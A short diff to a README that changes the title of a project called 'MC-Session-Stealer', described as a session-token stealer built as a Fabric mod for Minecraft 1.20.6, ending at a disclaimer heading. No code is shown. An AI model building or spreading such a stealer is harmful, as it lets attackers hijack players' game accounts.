@@ -1,4 +1,4 @@
-# MC-Session-Stealer
+# MC-Session-Stealer Fabric 1.20.6
 Simple Session-Token stealer written as a fabric mod for Minecraft 1.20.6
 
 # ⚠️ Disclaimer
